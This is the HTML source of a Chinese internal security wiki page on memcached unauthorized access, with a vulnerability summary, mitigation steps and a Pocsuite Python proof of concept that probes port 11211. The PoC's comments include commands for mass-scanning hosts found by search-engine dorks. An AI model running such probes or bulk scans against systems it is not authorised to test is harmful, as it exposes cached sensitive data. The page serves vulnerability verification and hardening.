                    
    
                    
    
                    
    
<!DOCTYPE html>
<html>
    <head>
        <title>查看源</title>
        <link rel="canonical" href="/pages/viewpage.action?pageId=$action.page.id" />
        <script>
window.WRM=window.WRM||{};window.WRM._unparsedData=window.WRM._unparsedData||{};window.WRM._unparsedErrors=window.WRM._unparsedErrors||{};
WRM._unparsedData["com.atlassian.plugins.atlassian-plugins-webresource-plugin:context-path.context-path"]="\u0022\u0022";
if(window.WRM._dataArrived)window.WRM._dataArrived();</script>
<link type="text/css" rel="stylesheet" href="/s/e6a993fbd5f9a96d7f9e250269edb793-CDN/zh_CN/7201/3d89a43db3618502ceb73a83aa0af888aa0a285a/84659ac4c1e45bd2d0be562d3fdacb4d/_/download/contextbatch/css/_super/batch.css" data-wrm-key="_super" data-wrm-batch-type="context" media="all">
<!--[if lt IE 9]>
<link type="text/css" rel="stylesheet" href="/s/e6a993fbd5f9a96d7f9e250269edb793-CDN/zh_CN/7201/3d89a43db3618502ceb73a83aa0af888aa0a285a/84659ac4c1e45bd2d0be562d3fdacb4d/_/download/contextbatch/css/_super/batch.css?conditionalComment=lt+IE+9" data-wrm-key="_super" data-wrm-batch-type="context" media="all">
<![endif]-->
<!--[if lte IE 9]>
<link type="text/css" rel="stylesheet" href="/s/e6a993fbd5f9a96d7f9e250269edb793-CDN/zh_CN/7201/3d89a43db3618502ceb73a83aa0af888aa0a285a/84659ac4c1e45bd2d0be562d3fdacb4d/_/download/contextbatch/css/_super/batch.css?conditionalComment=lte+IE+9" data-wrm-key="_super" data-wrm-batch-type="context" media="all">
<![endif]-->
<link type="text/css" rel="stylesheet" href="/s/d41d8cd98f00b204e9800998ecf8427e-CDN/zh_CN/7201/3d89a43db3618502ceb73a83aa0af888aa0a285a/259297d032f6c2eb68bc8778db0e9ca5/_/download/contextbatch/css/plugin.viewsource,-_super/batch.css" data-wrm-key="plugin.viewsource,-_super" data-wrm-batch-type="context" media="all">
<link type="text/css" rel="stylesheet" href="/s/05c9783eadef6eaefda0a664f5508375-CDN/zh_CN/7201/3d89a43db3618502ceb73a83aa0af888aa0a285a/606ed4d0b33417c38ad41c7240fd6541/_/download/contextbatch/css/page,-_super/batch.css?build-number=7201&amp;presenterForConfluenceLicensed=true" data-wrm-key="page,-_super" data-wrm-batch-type="context" media="all">
<link type="text/css" rel="stylesheet" href="/s/05c9783eadef6eaefda0a664f5508375-CDN/zh_CN/7201/3d89a43db3618502ceb73a83aa0af888aa0a285a/606ed4d0b33417c38ad41c7240fd6541/_/download/contextbatch/css/page,-_super/batch.css?build-number=7201&amp;media=print&amp;presenterForConfluenceLicensed=true" media="print" data-wrm-key="page,-_super" data-wrm-batch-type="context">
<link type="text/css" rel="stylesheet" href="/s/af45f723c07cfe9ea790812c17f81a33-CDN/zh_CN/7201/3d89a43db3618502ceb73a83aa0af888aa0a285a/c890abc318d78efad182b82f6ccc55df/_/download/contextbatch/css/editor-content,-_super/batch.css?confluence.table.resizable=true&amp;confluence.view.edit.transition=true" data-wrm-key="editor-content,-_super" data-wrm-batch-type="context" media="all">
<!--[if lte IE 9]>
<link type="text/css" rel="stylesheet" href="/s/af45f723c07cfe9ea790812c17f81a33-CDN/zh_CN/7201/3d89a43db3618502ceb73a83aa0af888aa0a285a/c890abc318d78efad182b82f6ccc55df/_/download/contextbatch/css/editor-content,-_super/batch.css?conditionalComment=lte+IE+9&amp;confluence.table.resizable=true&amp;confluence.view.edit.transition=true" data-wrm-key="editor-content,-_super" data-wrm-batch-type="context" media="all">
<![endif]-->
<link type="text/css" rel="stylesheet" href="/s/62670cd6c46dc9fd1c3fe85280142dff-T/zh_CN/7201/3d89a43db3618502ceb73a83aa0af888aa0a285a/5.1.8/_/download/batch/ch.bitvoodoo.confluence.plugins.viewtracker:viewtracker-auto-tracking-web-item-web-resource/ch.bitvoodoo.confluence.plugins.viewtracker:viewtracker-auto-tracking-web-item-web-resource.css" data-wrm-key="ch.bitvoodoo.confluence.plugins.viewtracker:viewtracker-auto-tracking-web-item-web-resource" data-wrm-batch-type="resource" media="all">

    </head>

    <body class="mceContentBody aui-theme-default wiki-content fullsize">
        <p>&nbsp;</p>         <h1>一. 漏洞简介</h1><p><span style="color: rgb(37,37,37);"><span style="color: rgb(26,26,26);">漏洞描述：</span>memcached是一套分布式的高速缓存系统。它以Key-Value（键值对）形式将数据存储在内存中，这些数据通常是应用读取频繁的。正因为内存中数据的读取远远大于硬盘，因此可以用来加速应用的访问。</span><span style="color: rgb(37,37,37);">由于memcached安全设计缺陷，客户端连接memcached服务器后</span><span style="color: rgb(37,37,37);">无需认证就</span><span style="color: rgb(37,37,37);">可读取、修改服务器缓存内容。</span></p><p><span style="color: rgb(26,26,26);">漏洞评级：</span><span style="color: rgb(26,26,26);">高危</span></p><p>参考链接：<span style="color: rgb(102,102,102);"> </span></p><p><span style="color: rgb(102,102,102);">1. <a href="https://zh.wikipedia.org/wiki/Memcached">https://zh.wikipedia.org/wiki/Memcached</a></span></p><p>2. <a href="https://github.com/memcached/memcached/wiki/Commands">https://github.com/memcached/memcached/wiki/Commands</a></p><p>3. <a href="http://niiconsulting.com/checkmate/2013/05/memcache-exploit/">http://niiconsulting.com/checkmate/2013/05/memcache-exploit/</a></p><p>4. <a href="http://blog.elijaa.org/2010/05/21/memcached-telnet-command-summary/">http://blog.elijaa.org/2010/05/21/memcached-telnet-command-summary/</a></p><p>5. <a href="http://www.alphadevx.com/a/90-Accessing-Memcached-from-the-command-line">http://www.alphadevx.com/a/90-Accessing-Memcached-from-the-command-line</a></p><p>6. <a href="http://www.slideshare.net/sensepost/cache-on-delivery/13-Goals_Connect_to_memcached_Find">http://www.slideshare.net/sensepost/cache-on-delivery/13-Goals_Connect_to_memcached_Find</a></p><p>7. <a href="https://www.sensepost.com/blog/2010/blackhat-write-up-go-derper-and-mining-memcaches/">https://www.sensepost.com/blog/2010/blackhat-write-up-go-derper-and-mining-memcaches/</a></p><p>8. <a href="https://www.blackhat.com/docs/us-14/materials/us-14-Novikov-The-New-Page-Of-Injections-Book-Memcached-Injections-WP.pdf">https://www.blackhat.com/docs/us-14/materials/us-14-Novikov-The-New-Page-Of-Injections-Book-Memcached-Injections-WP.pdf</a></p><p><br /></p><h1>二. 利用条件</h1><p>memcached对外开放，没有绑定监听IP，直接访问默认端口11211可获取数据库中敏感信息。</p><p><span style="color: rgb(37,37,37);"><br /></span></p><p><br /></p><h1>三. 漏洞验证</h1><p><span style="color: rgb(76,76,76);"><span style="color: rgb(37,37,37);">1、登录机器执行netstat -an |</span>more命令查看端口监听情况。回显0.0.0.0:11211表示在所有网卡进行监听，存在</span><span style="color: rgb(76,76,76);"><span style="color: rgb(37,37,37);">memcached</span><span>未授权访问漏洞。</span></span></p><p><span style="color: rgb(76,76,76);"><span>2、telnet </span></span><span style="color: rgb(76,76,76);">&lt;target&gt;</span><span style="color: rgb(76,76,76);"><span> 11211，</span></span><span style="color: rgb(76,76,76);"><span>或</span>nc -vv </span><span style="color: rgb(76,76,76);">&lt;target&gt;</span><span style="color: rgb(76,76,76);"> 11211，提示连接成功表示漏洞存在。</span></p><p><span style="color: rgb(76,76,76);">3、使用端口扫描工具nmap进行远程扫描：nmap -sV -p 11211 –script memcached-info &lt;target&gt;。</span></p><p><span style="color: rgb(76,76,76);">相关poc如下：</span></p><table class="wysiwyg-macro" data-macro-name="code" data-macro-id="37f536f2-8121-4fcc-b46e-ce94ec1d1625" data-macro-parameters="collapse=true|linenumbers=true" data-macro-schema-version="1" style="background-image: url(/plugins/servlet/confluence/placeholder/macro-heading?definition=e2NvZGU6bGluZW51bWJlcnM9dHJ1ZXxjb2xsYXBzZT10cnVlfQ&amp;locale=zh_CN&amp;version=2); background-repeat: no-repeat;" data-macro-body-type="PLAIN_TEXT"><tr><td class="wysiwyg-macro-body"><pre>#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Copyright (c) 2014-2015 pocsuite developers (http://seebug.org)
See the file 'docs/COPYING' for copying permission
"""
#命令行
from pocsuite import pocsuite_cli
#验证模块
from pocsuite import pocsuite_verify
#攻击模块
from pocsuite import pocsuite_attack
#控制台模式
from pocsuite import pocsuite_console
from pocsuite.api.request import req 
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase

class RedisPOC(POCBase):
    vulID = '19'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1' #默认为1
    vulDate = '2017-12-12' #漏洞公开的时间,不知道就写今天

    author = 'wangqi02' #  PoC作者的大名
    createDate = '2017-12-12'# 编写 PoC 的日期
    updateDate = '2017-12-12'# PoC 更新的时间,默认和编写时间一样
    references = ['']# 漏洞地址来源,0day不用写
    name = 'memcached Unauthorized access'# PoC 名称
    appPowerLink = ''# 漏洞厂商主页地址
    appName = 'memcached'# 漏洞应用名称
    appVersion = 'all versions'# 漏洞影响版本
    vulType = 'weak-pass'#漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        memcached未授权漏洞,可获取缓存中的敏感数据
    ''' # 漏洞简要描述
    samples = []# 测试样列,就是用 PoC 测试成功的网站
    install_requires = [] # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写

    def _verify(self):
        #定义返回结果
        result = {}
        #获取漏洞url
        vul_url = '%s' % self.url
        import re
        #如果设置端口则取端口,没有设置则为默认端口
        from pocsuite.lib.utils.funs import url2ip
        _port = re.findall(':(\d+)\s*', vul_url)
        if len(_port) != 0:
            _host = url2ip(vul_url)[0]
            _port = url2ip(vul_url)[1]
        else :
            _host = url2ip(vul_url)
            _port = 11211

        import socket
        payload = '\x73\x74\x61\x74\x73\x0d\x0a'
        s = socket.socket()
        socket.setdefaulttimeout(3)
        #检测漏洞
        try:
            s.connect((_host, _port))
            s.send(payload)
            recvdata = s.recv(1024)
            #print recvdata
            if recvdata and 'pid' in recvdata:
                #print u'\n【警告】' + host + "【存在未授权访问】"
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = host
                result['VerifyInfo']['Payload'] = payload
            else:
                #print u'\n【不存在漏洞】 ' + host
                pass
        except:
            # return host
            pass
        s.close()
        return self.save_output(result)

    #漏洞攻击
    def _attack(self):
        result = {}
        # 攻击代码
        return self._verify()

    def save_output(self, result):
        #判断有无结果并输出
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output

register(RedisPOC)

"""
PoC 编写规范及要求说明 https://github.com/knownsec/Pocsuite/blob/master/docs/CODING.md

使用方法 https://github.com/knownsec/Pocsuite/blob/master/docs/translations/USAGE-zh.md

集成 Pocsuite https://github.com/knownsec/Pocsuite/blob/master/docs/INTEGRATE.md


钟馗之眼 批量验证
pocsuite -r 1-redis-getshell.py --verify --dork "redis"  --max-page 50 --search-type host --report report.html


pocsuite -r 1-redis-getshell.py --verify -f results.txt --threads 10 --report report.html

"""</pre></td></tr></table><p><span style="color: rgb(76,76,76);">测试结果</span></p><p><span style="color: rgb(76,76,76);"><img class="confluence-embedded-image" src="/download/attachments/45556141/image2017-12-13_10-54-10.png?version=1&amp;modificationDate=1513133684000&amp;api=v2" data-image-src="/download/attachments/45556141/image2017-12-13_10-54-10.png?version=1&amp;modificationDate=1513133684000&amp;api=v2" data-unresolved-comment-count="0" data-linked-resource-id="45556191" data-linked-resource-version="1" data-linked-resource-type="attachment" data-linked-resource-default-alias="image2017-12-13_10-54-10.png" data-base-url="https://confluence.360es.cn" data-linked-resource-content-type="image/png" data-linked-resource-container-id="45556141" data-linked-resource-container-version="6" title="网络安全部公共空间 > memcached未授权访问漏洞 > image2017-12-13_10-54-10.png" data-location="网络安全部公共空间 > memcached未授权访问漏洞 > image2017-12-13_10-54-10.png" data-image-height="546" data-image-width="804"></span></p><p><span style="color: rgb(76,76,76);"><br /></span></p><h1>四. 漏洞利用</h1><p><span style="color: rgb(37,37,37);">除memcached中数据可被直接读取泄漏和恶意修改外，由于memcached中的数据像正常网站用户访问提交变量一样会被后端代码处理，当处理代码存在缺陷时会再次导致不同类型的安全问题。</span></p><p><span style="color: rgb(37,37,37);">不同的是，在处理</span><span style="color: rgb(37,37,37);">前端用户直接输入的数据时一般会接受更多的安全校验，而从memcached中读取的数据则更容易被开发者认为是可信的，或者是已经通过安全校验的，因此更容易导致安全问题。</span></p><p><span style="color: rgb(37,37,37);">由此可见，导致的二次安全漏洞类型一般</span><span style="color: rgb(37,37,37);">由memcached数据使用的位置（XSS通常称之为sink）的不同而不同，</span><span style="color: rgb(37,37,37);">如：</span></p><p><span style="color: rgb(37,37,37);">        （1）缓存数据未经过滤直接输出可导致XSS；</span></p><p><span style="color: rgb(37,37,37);">        （2）</span><span style="color: rgb(37,37,37);">缓存数据</span><span style="color: rgb(37,37,37);">未经过滤代入拼接的SQL注入查询语句可导致SQL注入；</span></p><p><span style="color: rgb(37,37,37);">        （3）</span><span style="color: rgb(37,37,37);">缓存数据</span><span style="color: rgb(37,37,37);">存储敏感信息（如：用户名、密码），可以通过读取操作直接泄漏；</span></p><p><span style="color: rgb(37,37,37);">        （4）</span><span style="color: rgb(37,37,37);">缓存数据</span><span style="color: rgb(37,37,37);">未经过滤直接通过system()、eval()等函数处理可导致命令执行；</span></p><p><span style="color: rgb(37,37,37);">        （5）</span><span style="color: rgb(37,37,37);">缓存数据</span><span style="color: rgb(37,37,37);">未经过滤直接在header()函数中输出，可导致CRLF漏洞（HTTP响应拆分）。</span></p><p><span style="color: rgb(37,37,37);">                  … …</span></p><h1>五. 解决方案</h1><p><span style="color: rgb(37,37,37);">1、配置memcached监听本地回环地址127.0.0.1。</span></p><table class="wysiwyg-macro" data-macro-name="code" data-macro-id="b524cebf-4f95-4948-b51a-cfc747c88622" data-macro-parameters="linenumbers=true" data-macro-schema-version="1" style="background-image: url(/plugins/servlet/confluence/placeholder/macro-heading?definition=e2NvZGU6bGluZW51bWJlcnM9dHJ1ZX0&amp;locale=zh_CN&amp;version=2); background-repeat: no-repeat;" data-macro-body-type="PLAIN_TEXT"><tr><td class="wysiwyg-macro-body"><pre>[root@local ~]# vim /etc/sysconfig/memcached
OPTIONS="-l 127.0.0.1"  #设置本地为监听
[root@local ~]# /etc/init.d/memcached restart #重启服务

</pre></td></tr></table><p><span style="color: rgb(37,37,37);">2、当memcached</span><span style="color: rgb(37,37,37);">配置为监听内网IP或公网IP时，</span><span style="color: rgb(37,37,37);">使用主机防火墙（iptalbes、</span><span style="color: rgb(37,37,37);">firewalld等）和</span><span style="color: rgb(37,37,37);">网络防火墙对memcached服务端口</span><span style="color: rgb(37,37,37);">进行过滤。</span></p><p><span>3、最小化权限运行</span><br /><br /><span>使用普通权限账号运行，以下指定memcached 用户运行</span><br /><br /><span>memcached -d -m 1024 -u memcached -l 127.0.0.1 -p 11211 -c 1024 -P /tmp/memcached.pid</span></p><p>4、配置账户、密码</p><p><br /></p><p><br /></p><p><br /></p><p><br /></p><p><br /></p><p><span style="color: rgb(76,76,76);"><br /></span></p>
        <p>&nbsp;</p>
    </body>
</html>
